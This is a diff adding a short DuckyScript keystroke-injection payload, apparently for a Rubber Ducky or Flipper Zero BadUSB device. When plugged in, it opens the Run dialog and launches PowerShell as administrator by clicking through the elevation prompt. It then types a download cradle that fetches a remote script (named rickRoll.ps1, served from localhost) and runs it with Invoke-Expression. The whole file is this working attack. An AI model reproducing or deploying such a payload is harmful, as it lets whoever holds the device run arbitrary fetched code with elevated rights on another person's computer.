@@ -1,0 +1,16 @@
+REM Remove the line below for Flipper zero
+DUCKY_LANG US
+GUI r
+DELAY 2000
+STRING powershell
+DELAY 2000
+CONTROL SHIFT ENTER
+DELAY 2000
+LEFT
+DELAY 1000
+ENTER
+DELAY 4000
+STRING Invoke-Expression ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://localhost:3002/scripts/rickRoll.ps1" -UseBasicParsing).Content))
+DELAY 2000
+ENTER
+
